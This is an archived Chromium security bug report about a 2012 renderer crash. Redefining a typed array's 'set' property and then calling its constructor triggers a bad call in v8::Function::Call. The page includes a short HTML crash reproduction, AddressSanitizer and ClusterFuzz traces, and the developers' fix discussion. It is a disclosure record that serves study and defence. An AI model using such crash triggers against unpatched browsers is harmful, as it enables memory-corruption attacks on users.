# UNKNOWN in v8::Function::Call

| Field | Value |
|-------|-------|
| **Issue ID** | [40058853](https://issues.chromium.org/issues/40058853) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>JavaScript, Blink>WebGL, Internals |
| **Reporter** | mi...@gmail.com |
| **Assignee** | ul...@chromium.org |
| **Created** | 2012-05-27 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

as per bug:  

<https://bugs.webkit.org/show_bug.cgi?id=75532>

redefining setter on typed array to a number, then calling the constructor for that typed array, with a function as an argument, results in (good|bad) stuff.

Int32Array.prototype.set = 0x3ffff  

new Int32Array(function() {})

if the first argument is an array, a different branch is taken. the 'value' of set goes into the high bits of the faulty address.

**VERSION**  

Chrome Version: stable + dev

Chromium 21.0.1154.0 (Developer Build 139215)  

OS Linux  

WebKit 537.1 (@118560)  

JavaScript V8 3.11.6.2

Operating System: 64bit precise

**REPRODUCTION CASE**

<html>
<head>
<script>
var arrays = ['Float32Array', 'Float64Array', 'Int8Array', 'Int16Array', 'Int32Array', 'Uint8Array', 'Uint8ClampedArray', 'Uint16Array', 'Uint32Array']
var some=arrays[Math.floor(Math.random()\\*arrays.length)]
window[some].prototype.set = 0x3ffff
new window[some]([0], function() {})
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

==24558== ERROR: AddressSanitizer crashed on unknown address 0x7fffe0000009 (pc 0x555558143c62 sp 0x7fffffff7f40 bp 0x7fffffff8070 T0)  

AddressSanitizer can not provide additional info. ABORTING  

#0 0x555558143c62 in v8::Function::Call(v8::Handle[v8::Object](javascript:void(0);), int, v8::Handle[v8::Value](javascript:void(0);)\*) ???:0  

#1 0x55555a7554e9 in WebCore::copyElements(v8::Handle[v8::Object](javascript:void(0);), v8::Handle[v8::Object](javascript:void(0);), unsigned int) ???:0  

#2 0x555559ef8dd7 in v8::Handle[v8::Value](javascript:void(0);) WebCore::constructWebGLArray<WTF::Int8Array, signed char>(v8::Arguments const&, WebCore::WrapperTypeInfo\*, v8::ExternalArrayType) ???:0  

#3 0x5555581927fd in v8::internal::Builtin\_HandleApiCallConstruct(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate\*) v8/src/builtins.cc:0

## Attachments

- [stable-typed-arrays.txt](attachments/stable-typed-arrays.txt) (text/x-c; charset=us-ascii, 4.9 KB)
- [typed-arrays.txt](attachments/typed-arrays.txt) (text/x-c; charset=us-ascii, 4.9 KB)
- [typed-arrays.html](attachments/typed-arrays.html) (text/html; charset=us-ascii, 387 B)
- [129951](attachments/129951) (text/x-diff; charset=us-ascii, 10.4 KB)

## Timeline

### in...@chromium.org (2012-05-27)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-28)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-28)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=52482080

Uploader: inferno@chromium.org

Crash Type: UNKNOWN
Crash Address: 0x7fffe0000009
Crash State:
  - crash stack -
  v8::Function::Call
  WebCore::copyElements
  v8::Handle<v8::Value> WebCore::constructWebGLArray<WTF::Uint16Array, unsigned short>
  

Minimized Testcase (0.32 Kb): https://cluster-fuzz.appspot.com/download/AMIfv96OWraNesEaY_EgelUOmBW-bHEku8SZbkZwgPi61RkS0a60xs70ojfugS96nAlLB2XUztbKzk5iGJshGwkzCNyj2PNBuRJJ00b3YgSFJGnavceTmLxRtSpW6PiGvz32-xRQGnO96IxC1tP0KfvKFd7pneaaCg

### in...@chromium.org (2012-05-28)

[Empty comment from Monorail migration]

### js...@chromium.org (2012-05-28)

Not sure if this is in v8 or WebGL, so adding in @kbr.

### kb...@chromium.org (2012-05-29)

Looks like a missing type and NULL check in the custom bindings -- in particular, the fetching of the "set" function in copyElements, Source/WebCore/bindings/v8/custom/V8ArrayBufferViewCustom.cpp in WebKit.

Ulan, do you think you could take care of this?

Renderer-only crash. I'm not sure whether this warrants SecSeverity-High.


### in...@chromium.org (2012-05-29)

A bad cast in the renderer qualifies for a SecSeverity-High.

### sc...@gmail.com (2012-05-29)

A missing type check typically might result in a bad cast, which can frequently be a high severity issue.

Also, Ulan, can you scan the surrounding area and functions for similar problems?

### ul...@chromium.org (2012-05-30)

I am looking into it.

### ul...@chromium.org (2012-05-30)

I have a fix that needs to be landed in WebKit.

How do I proceed? Can I simply open a corresponding security bug in WebKit and upload the patch there?

The fix removes calls to the "set()" method from C++. Instead of that, it stores the copying  script as a hidden property of a typed array prototype, so it cannot be overwritten by user code. Performance is almost the same as before (within 5%, tested here http://jsperf.com/uint8array-from-array).


### in...@chromium.org (2012-05-30)

Please use the webkit security bug filing template - https://bugs.webkit.org/enter_bug.cgi?product=Security

### ul...@chromium.org (2012-05-30)

Uploaded to https://bugs.webkit.org/show_bug.cgi?id=87862

### kb...@chromium.org (2012-05-30)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-30)

http://trac.webkit.org/changeset/118955

### cl...@chromium.org (2012-05-31)

ClusterFuzz has detected this issue as fixed in range 139727:139739.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=52482080

Uploader: inferno@chromium.org

Crash Type: UNKNOWN
Crash Address: 0x7fffe0000009
Crash State:
  - crash stack -
  v8::Function::Call
  WebCore::copyElements
  v8::Handle<v8::Value> WebCore::constructWebGLArray<WTF::Uint16Array, unsigned short>
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=139727:139739

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96OWraNesEaY_EgelUOmBW-bHEku8SZbkZwgPi61RkS0a60xs70ojfugS96nAlLB2XUztbKzk5iGJshGwkzCNyj2PNBuRJJ00b3YgSFJGnavceTmLxRtSpW6PiGvz32-xRQGnO96IxC1tP0KfvKFd7pneaaCg

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### ul...@chromium.org (2012-06-01)

Since I am not a WebKit committer, it looks like I cannot merge to M20 and M19.

Could anybody merge it for me please?

### in...@chromium.org (2012-06-01)

We will merge it when the merge window opens! Thanks for the fix.

### sc...@gmail.com (2012-06-07)

M20: http://trac.webkit.org/changeset/119658

### sc...@gmail.com (2012-06-22)

Nice bug. Different to normal :)
$1000

### sc...@gmail.com (2012-06-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/129951?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink, Blink>JavaScript, Blink>WebGL, Internals]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058853)*
